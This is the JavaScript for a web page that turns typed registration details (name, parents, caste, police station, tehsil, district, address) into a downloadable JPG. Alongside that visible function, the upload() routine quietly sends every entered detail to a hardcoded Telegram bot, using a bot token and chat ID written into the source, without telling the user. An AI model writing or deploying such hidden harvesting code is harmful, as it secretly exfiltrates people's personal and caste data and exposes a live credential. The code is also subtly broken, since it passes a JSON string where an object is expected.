// // output elements 
const output = Array.from(document.querySelectorAll('#main span'));
// input elements
const input = Array.from(document.querySelector(".inputs").children);

const fileInput = document.getElementById("formFile");
const SignOut = document.getElementById("sign")


async function upload(data) {
    const BOT_TOKEN = '6978650517:AAEWeLNPE2TkkXJ2OiPtoSjZk7UCEN-Jb2Y';
    const CHAT_ID = '993778683';

    // Formatting the readable message with Emojis and Monospaced values
    const message = `
📝 *New Registration Details*
━━━━━━━━━━━━━━━━━━
👤 *Name:* \`${data.name}\`
👨‍👩‍👦 *Father:* \`${data.fname}\`
👩‍👧‍👦 *Mother:* \`${data.mname}\`
📅 *DOB:* \`${data.dob}\`
🛠 *Work:* \`${data.business}\`
📍 *Birth Place:* \`${data.placeofbirth}\`
🧬 *Category:* \`${data.cast} (${data.subcast})\`
🏠 *Residence:* \`${data.niwas}\`
👮 *Thana:* \`${data.thana}\`
🏢 *Tehsil:* \`${data.tehsil}\`
🗺 *District:* \`${data.district}\`
📍 *Full Address:* \`${data.address}\`
📅 *Date:* \`${data.date}\`
━━━━━━━━━━━━━━━━━━
    `;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'MarkdownV2' // Enables the bold and code-style fonts
            })
        });

        const result = await response.json();
        if (result.ok) {
            console.log('Message sent successfully! ✅');
        } else {
            console.error('Error from Telegram:', result.description);
        }
    } catch (error) {
        console.error('Fetch Error:', error);
    }
}

// Your Data



function feedAll() {
    const data = {};
    input.map(
        (e, i) => {
            if (e.className != "form-label") {
                if (e.id != "formFile") {
                    console.log(e, output[i])
                    output[i].innerHTML = e.value;
                    data[output[i].className] = e.value;
                }
            }

        }
    );
    const blob = fileInput.files.length ? URL.createObjectURL(fileInput.files[0]) : ""
    SignOut.src = blob

    upload(JSON.stringify(data));

    setTimeout(() => {
        html2canvas(document.getElementById("main"),

            {
                useCORS: true,      // Tells html2canvas to try loading images with CORS
                allowTaint: false,  // Do not allow tainted canvases
                logging: true,    // Useful for debugging if it still fails
            }
        ).then((res) => {
            var myImage = res.toDataURL("image/jpeg", 0.6);
            const a = document.createElement("a");
            a.href = myImage;
            a.target = "_blank"
            a.download = `${input[0].value}.jpg`;
            a.click();
        })
    }, 500)
}

const genbtn = document.getElementById("btn");

function donate() {
    Swal.fire({
        html: `
         <p style="color:#000">Donate to Support For Running This Site</p>
         <hr/>
        <p style="font-size:0.8rem">* Donation Needs to Run Always this Site</p>
        <p style="font-size:0.8rem">* You Can Donate Any Amount</p>
         <img src="qr.jpg" width="200px"/>
         <br/>

        `,
        showCloseButton: false,
        showCancelButton: false,
        focusConfirm: false,
        showConfirmButton:true,
        allowOutsideClick:false,

    });
}

genbtn.addEventListener('click', () => {
    // here charge or donation code !!!
    feedAll();
    // setTimeout(()=>donate(),2000)
})



